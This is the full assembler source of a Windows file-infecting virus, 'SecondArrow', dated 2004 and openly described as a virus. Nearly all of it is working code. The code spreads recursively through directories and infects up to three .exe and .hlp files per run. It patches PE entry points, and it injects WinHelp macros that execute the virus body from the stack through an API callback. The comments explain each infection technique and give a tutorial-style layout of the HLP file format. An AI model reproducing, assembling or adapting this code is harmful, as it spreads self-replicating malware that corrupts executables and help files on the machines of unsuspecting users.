;
; SecondArrow by BlueOwl
;
; HLP/EXE (Cross)-Infector
;
; Disclaimer
;
;  This is the assembler source of a VIRUS. Me, the author
;  cannot be held responsible for any problems caused by
;  the compiled program. Please do not assemble it if you do
;  not know what you are doing.
;
; Description
;
;  Exes and hlps have always been in a nice kind of circulation,
;  and this is exactly what this virus exploits, infecting both.
;  It infects up to 3 files per run and only randomly activates
;  its payload when no file was infected. I liked doing something
;  like this because i thought it was fun combining to techniques
;  of infection into one.
;
; About hlps
;
;  Hlps are a little bit harder to infect than exefiles (when dealing
;  with the bare minimum infection), and infecting hlps is relatively
;  onnused comparing to the thousands of exeinfectors around this globe.
;  However, it is quite possible to do so and it can work under any
;  windows platform with most versions of winhlp.exe.
;
;  Hlp file infection just exploits the very simple fact that you can
;  use any windows function in hlps. So for example you could use
;  MessageBoxA(0,"Hello","Dear reader",0); and when the hlpfile loads
;  it will display this string. Now the thing that can be exploited
;  here is that one could also pass something like EnumWindows("[string]"
;  , 0); to it and the "[string]" would be executed because this is
;  an ENUMERATE function (windows calls the first argument). And
;  this string can also be the virus code. There is however one problem:
;  the virus must be a string and thus can't be executed if any
;  zero's are present in the string. This is solved in hlp virusses by
;  writing/pusing the entire virus body onto stack and executing it there.
;
; Payload
;
;  Make a scary sound. ;)
;
; Assemble with fasm (version 1.50/1.52 should work fine at least)
;  get it from http://www.flatassembler.net

format PE GUI 4.0

include '%fasminc%\win32a.inc'	; fasm assembles this FLAT with read/write/execute attributes

; .equates
GENERIC_READWRITE equ 0C0000000h
find_data	equ (_fd-4)
hfind		equ (_hf-4)
virus_size	equ ((virus_enda-virus_start)/4+1)*4	; aligned to a dword (required when being in stack)
virus_end	equ (virus_start+virus_size)		; otherwise the virus will start with a few zeros
OldEip		equ (oep-4)

macro wcall proc,[arg]			; wcall procedure (indirect)
 { common				; a macro for calling windows apis ;)
    if ~ arg eq
     stdcall [ebp+proc-delta],arg
    else
     call [ebp+proc-delta]
    end if }


; .startup
		mov	dword [OldEip], exit
; .code
virus_start:	push	012345678h		; only used when an exe was infected
oep:		pushad				; save regs
		cld				; clear direction flag
decrypt_from:	call	set_seh_handler
		mov	esp, [esp+8]		; restore seh
		jmp	error_occurred

		db	"..SecondArrow.."

set_seh_handler:sub	eax, eax
		fs push dword [eax]
		fs mov	[eax], esp		; setup self exeption handling

exehlpa:	stc				; this is a clc when we are a hlp
		jc	exe_start

		mov	edi, [esp+virus_size+44] ; esi = return address (in kernel32)
		jmp	in_find_k32
exe_start:	mov	edi, [esp+44]		; edi = somewhere in k32
		jmp	in_find_k32
find_k32:	dec	edi			; what do you think of this routine ;)
in_find_k32:	sub	di, di			; align
		cmp	word [edi], "MZ"
		jnz	find_k32		; edi = base of kernel32

		call	load_delta
delta:		dd	0c3941b3eh		; data is carried close to delta so
CreateFile	dd	?		       ; this way most references are small
		dd	092d23c21h
ReadFile	dd	?
		dd	0b9b3edbfh
SetFilePointer	dd	?
		dd	0d43240b9h
WriteFile	dd	?
		dd	08a425b5dh
CloseHandle	dd	?
		dd	0bda885d4h
FindFirstFile	dd	?
		dd	06c38b20bh
FindNextFile	dd	?
		dd	0a050a531h
FindClose	dd	?
		dd	0c6c1b075h
GlobalAlloc	dd	?
		dd	0c4617123h
GlobalLock	dd	?
		dd	05837bb59h
GlobalUnlock	dd	?
		dd	0b8925923h
GlobalFree	dd	?
		dd	0642682e4h
SetCurrentDirectory dd	?
		dd	08a844000h
Beep		dd	?		; for the payload
		dd	030e656feh
GetTickCount	dd	?		; ditto
		dd	0

infection_count db	0

hmem		dd	"Spac"
hfile		dd	"e fo"
hfmem		dd	"r re"
hfstart 	dd	"nt $"
nbr		dd	"5 ! "
all_mask	db	"*.*",0	    ; seach for whatever

macrostart	db	4,0,_mse-_ms,0
_ms		db	'RR("KERNEL32","EnumSystemCodePagesA","SU")',0	; a macro with callback features
_mse:		db	4,0
macro_size	dw	?
enumw		db	'EnumSystemCodePagesA("'
		xchg	edi, esp		; edi = esp
		std				; decrementing pointer
		dec	edi			; otherwise the last byte would get overwritten
endmacrostart:
startmacrosize	equ	(endmacrostart-macrostart)

macroend:	xchg	edi, esp		; esp = edi
		inc	esp			; actual entry
		push	esp
		ret				; jump to esp
		db	'",0)',0
endmacroend:
endmacrosize	equ	(endmacroend-macroend)


load_delta:	pop	ebp		; ebp = delta handle
		mov	esi, ebp
		lodsd
get_funcs:	xchg	ebx, eax
		push	esi
		push	ebp
		mov	ebp, [edi+60]
		add	ebp, edi	; ebp = ptr to peheader
		mov	ebp, [ebp+120]
		add	ebp, edi	; ebp = ptr to export table
		mov	edx, [ebp+36]
		add	edx, edi	; edx = ptr to function ordinals
		mov	esi, [ebp+32]
		add	esi, edi	; esi = ptr to ptrs of function names
		mov	ecx, [ebp+20]	; ecx = number of exported functions
find_function:	push	esi
		push	edx
		sub	eax, eax
		cdq			; edx=eax=0
		mov	esi, [esi]
		add	esi, edi	; esi = ptr to function name
make_checksum:	lodsb
		add	edx, eax
		rol	edx, 5
		or	eax, eax
		jnz	make_checksum	; edx = checksum
		cmp	edx, ebx	; compare with needed
		pop	edx
		pop	esi
		jz	ff_ok
		add	esi, 4		; next namepointer
		inc	edx
		inc	edx		; next ordinal
		loop	find_function
		jmp	function_notfound ; exit with eax = 0
ff_ok:		mov	esi, [ebp+28]
		add	esi, edi	; esi = ptr to function addresses
		movzx	ecx, word [edx] ; ecx = function number
		inc	ecx		; ecx ++
		rep	lodsd
		add	eax, edi	; eax = function address
function_notfound:
		pop	ebp
		pop	esi
		mov	[esi], eax
		or	eax, eax		; function could not be found?
		je	error_occurred
		lodsd
		lodsd
		or	eax, eax
		jnz	get_funcs		; load all functions

		mov	byte [ebp+infection_count-delta], 3 ; better not more then 3 ;)

		wcall	GlobalAlloc,GMEM_MOVEABLE,314
		or	eax, eax
		jz	error_occurred
		mov	[ebp+find_data-delta], eax
		wcall	GlobalLock,eax
		mov	[ebp+hmem-delta], eax

		call	infect_files

		cmp	byte [ebp+infection_count-delta], 3 ; nothing infected?
		jnz	close_mem
		wcall	GetTickCount		; Get a "random" number

		cmp	al, 44h 		; so this occurs one in about 256 times
		jnz	close_mem

		; payload
		push	37			; make a scary sound payload :)
		pop	esi
		sub	edi, edi
countup:	add	esi, edi
		wcall	Beep,esi,40
		inc	esi
		test	esi, 7
		jnz	nok
		inc	edi
nok:		cmp	esi, 1500
		jb	countup

close_mem:	mov	esi, 012345678h
_fd:		wcall	GlobalUnlock,esi
		wcall	GlobalFree,esi
error_occurred: sub	eax, eax
		fs pop	dword [eax]
		pop	ebx
exehlpb:	stc
		popad
		jc	exit_exe
		add	esp, virus_size+4	; fix stack
		sub	eax, eax		; return false
		ret	4

exit_exe:	ret

; ///////////////////////////////////////////////////////////////////////////

infect_files:	lea	eax, [ebp+all_mask-delta] ; seach for anything
		wcall	FindFirstFile,eax,[ebp+hmem-delta]
		mov	[ebp+hfind-delta], eax	; save findhandle
		inc	eax
		jz	no_file_found		; close memory on error


try_next_file:	cmp	byte [ebp+infection_count-delta], 0
		jz	no_file_found		; close search
		mov	edi, [ebp+hmem-delta]

		mov	eax, [edi+32]		; eax = size of file
		and	al, 15
		cmp	al, 15			; check for infection padding
		jz	already_infected

		call	set_infection_seh
		mov	esp, [esp+8]
		jmp	restore_seh
set_infection_seh:
		sub	eax, eax
		fs push dword [eax]
		fs mov	[eax], esp

		; open and read file

		lea	ebx, [edi+44d]

		mov	esi, ebx		; esi = start of filename
find_end:	lodsb
		or	al, al
		jnz	find_end		; esi = ptr to end of file name
		mov	eax, [esi-5]		; eax = file extension
		or	eax, 020202020h 	; to lowercase
		cmp	eax, ".exe"
		je	ext_ok
		cmp	eax, ".hlp"
		jne	not_infectable
ext_ok:
		sub	eax, eax
		wcall	CreateFile,ebx,GENERIC_READWRITE,eax,eax,3,128,eax  ; open the file

		mov	[ebp+hfile-delta], eax
		inc	eax
		jz	cant_open_file

		mov	eax, dword [edi+32d]
		add	eax, virus_size*3+4000h ; add some extra space

		wcall	GlobalAlloc,GMEM_MOVEABLE,eax	; Get some space
		or	eax, eax
		jz	close_file
		mov	[ebp+hfmem-delta], eax
		wcall	GlobalLock,eax		; Lock it (required for some windowsversions)

		or	eax, eax
		jz	close_fmem
		mov	[ebp+hfstart-delta], eax

		push	eax

		lea	ebx, [ebp+nbr-delta]

		wcall	ReadFile,[ebp+hfile-delta],eax,[edi+32d],ebx,0	; Load file into memory
		or	eax, eax
		jz	close_lock

		pop	edx
		mov	edi, edx		; save start to edi too

		push	edx
		lea	eax, [ebp+exehlpa-delta]
		lea	ecx, [ebp+exehlpb-delta]
		push	dword [ecx]
		push	ecx
		mov	ebx, [esi-5]
		or	ebx, 020202020h
		cmp	ebx, ".exe"
		je	is_exe
		mov	byte [eax], 0f8h
		mov	byte [ecx], 0f8h	; hlp marker (clc)
		call	infect_hlpfile
		jmp	infect_done
is_exe: 	mov	byte [eax], 0f9h        ; exe marker (stc)
		mov	byte [ecx], 0f9h
		call	infect_exefile
infect_done:	pop	eax
		pop	dword [eax]
		pop	edx
		jc	close_lock		; carry flag is on if error happened

		dec	byte [ebp+infection_count-delta] ; take on off the infection counter

		sub	edi, edx		; edi = size of file

		push	edi
		wcall	SetFilePointer,[ebp+hfile-delta],0,0,FILE_BEGIN
		pop	ecx

		or	cl, 15			; infection sign

		lea	eax, [ebp+nbr-delta]
		wcall	WriteFile,[ebp+hfile-delta],[ebp+hfstart-delta],ecx,eax,0

close_lock:	wcall	GlobalUnlock,[ebp+hfmem-delta]
close_fmem:	wcall	GlobalFree,[ebp+hfmem-delta]
close_file:	wcall	CloseHandle,[ebp+hfile-delta]
cant_open_file:
		jmp	restore_seh

not_infectable: cmp	dword [edi], FILE_ATTRIBUTE_DIRECTORY ; is this a directory?
		jnz	restore_seh
		lea	eax, [edi+44]
		cmp	byte [eax], "." 		   ; is a root?
		jz	restore_seh
		wcall	SetCurrentDirectory,eax 	      ; set it as dir
		push	dword [ebp+hfind-delta]
		call	infect_files			      ; recursive call
		pop	dword [ebp+hfind-delta]
		call	dot_dot
		db	"..",0
dot_dot:	wcall	SetCurrentDirectory		      ; return to this dir
restore_seh:	sub	eax, eax
		fs pop	dword [eax]
		pop	eax

already_infected:
		push	[ebp+hmem-delta]
		push	012345678h
_hf:		call	[ebp+FindNextFile-delta]
		or	eax, eax
		jnz	try_next_file
no_file_found:
		wcall	FindClose,[ebp+hfind-delta]
		ret


; ----------------------------------------------------------------------------------------

; both routines
; on entry:     edi = edx = start of file
;
; on exit:      carry on: error happened
;               carry off: infection successfull

; i tried to make the smallest possible routine for this
; all is old school and should be easily understandable
; reading the comments ;)

infect_exefile: cmp	word [edx], "MZ"		; "MZ" present?
		jnz	no_good_exe
		add	edx, [edx+60]
		cmp	word [edx], "PE"		; "PE" present?
		jnz	no_good_exe
		mov	esi, edx			; esi = peheader
		add	esi, 120			; esi = dirheader
		mov	eax, [edx+116]			; eax = number of dir entries
		shl	eax, 3				; eax = eax*8
		add	esi, eax			; esi = first section header
		movzx	eax, word [edx+6]		; eax = number of sections
		dec	eax				; eax = eax-1
		imul	eax,eax,40
		add	esi, eax			; esi = ptr to last section header
		or	byte [esi+39], 0F0h		; give section necessary rights
		mov	ecx, virus_size 		; ecx = size of virus
		mov	ebx, [esi+16]			; ebx = physical size of section
		add	[esi+16], ecx			; increase section physical size
		add	[esi+8], ecx			; increase section virtual size
		push	dword [esi+8]			; push section virtual size
		pop	dword [edx+80]			; imagesize = section virtual size
		mov	eax, [esi+12]			; eax = section rva
		add	[edx+80], eax			; add it to the imagesize
		add	edi, [esi+20]			; edi = section offset
		add	edi, ebx			; edi = end of section
		add	eax, ebx			; eax = rva of virus
		xchg	[edx+40], eax			; swap it with old entrypoint
		add	eax, [edx+52]			; add imagebase to it
		mov	[ebp+OldEip-delta], eax 	; save it
		lea	esi, [ebp+virus_start-delta]	; esi = virus start
		rep	movsb				; edi = ptr to end of file
		clc					; indicate sucess
		ret
no_good_exe:	stc					; indicate error
		ret

; HLP Infection routine, see upper comments
; and comments below to see how it works
;
; .The source of HLP.AYUDA (29a#5) was very helpfull when
; .i got lost a little! Thankyou Bumblebee.
;
; Here is a little "diagram" about how we touch this stuff.
; Note: if you don't know, rb [num] means [num] bytes
; dots mean and undefined number of data
;
; -------- HLP FILE -------
;
; Magic    dd 00035f3fh
; DirStart dd offset main_directory
; NotDir   dd ?
; filesize dd official filesize
;           .
;           .
;           .
; main_directory:
; String   rb 9
; Magic    dw 293bh
; Data     rb 28
; Kind     dw ?
;           .
;           .
;           .
; String   "|SYSTEM"
; System   dd offset to system_directory
;           .
;           .
; system_directory:
; data     rb ? (here is the old system directory)
;           .
;           .
;           .
; eof_file:
;           (here the old system_directory + our stuff comes)
;
; ----------------------------


infect_hlpfile: cmp	dword [edi], 00035f3fh		; check for magic value
		jnz	no_good_hlp
		mov	esi, [edi+12]			; esi = filesize
		add	edi, [edi+4]			; edi = ptr to hlpfileheader
		cmp	word [edi+9], 293bh		; check for magic here
		jnz	no_good_hlp
		cmp	word [edi+39], 1		; check if the data is not indexed
		jnz	no_good_hlp

		mov	ecx, 565			; set scan range
find_system:	inc	edi
		cmp	dword [edi], "|SYS"		; find |SYSTEM, ignoring all between
		jz	system_found
		loop	find_system
		jmp	no_good_hlp

system_found:	xchg	esi, [edi+8]			; swap it with ptr to system dir
		add	esi, edx			; get system dir
		cmp	word [esi+9], 036ch		; check if system dir
		jnz	no_good_hlp
		mov	ecx, [esi]			; size of system dir
		mov	edi,edx
		add	edi,[edx+12]			; edi = ptr to end of file
		push	edi				; save start
		rep	movsb				; copy old system directory
		push	edi
		lea	esi, [ebp+macrostart-delta]	; copy start of new macro
		mov	ecx, startmacrosize
		rep	movsb

		lea	esi, [ebp+virus_end-delta]
		mov	ecx, virus_size


	; The whole virus will be translated into
	; "mov al, virus_byte[x]; stosb" 's, if
	; the character is a zero a "sub al, al;
	; stosb" is used instead. Furthermore
	; other "special" chars are "\"d.

loop_generate:	mov	al, 0B0h	; mov al, ..
		dec	esi
		mov	ah, byte [esi]
		cmp	ah, 22h 	; '"'
		je	fix_it
		cmp	ah, 27h 	; '''
		je	fix_it
		cmp	ah, 5ch 	; '\'
		je	fix_it
		cmp	ah, 60h 	; '''
		je	fix_it
		or	ah, ah		; 0
		jnz	no_fix
		mov	ax, 0C028h	; sub al, al
		jmp	no_fix
fix_it: 	stosb
		mov	al, '\'
no_fix: 	stosw
		mov	al, 0AAh	; stosb
		stosb
		loop	loop_generate

		lea	esi, [ebp+macroend-delta]
		mov	cl, endmacrosize
		rep	movsb

		pop	esi		; get start of new sysdir
		pop	ebx
		mov	ecx, edi	; ecx = edi
		sub	ecx, esi	; ecx = size of new sysdir
		sub	ecx, (enumw-macrostart)
		mov	word [esi+macro_size-macrostart], cx

		mov	ecx, edi
		sub	edi, ebx	; edi = system size
		mov	[ebx], edi
		add	[edx+12], edi
		sub	edi, 9
		mov	[ebx+4], edi

		xchg	ecx, edi	; edi = end of file
		clc			; indicate success
		ret

no_good_hlp:	stc			; failure
		ret

; i hope you understood this stuff!

		db	"My way into history!",13,10
		db	"BlueOwl June/2004"

virus_enda:

padding 	dd	0

exit:		ret

; BlueOwl June/2004 ;)


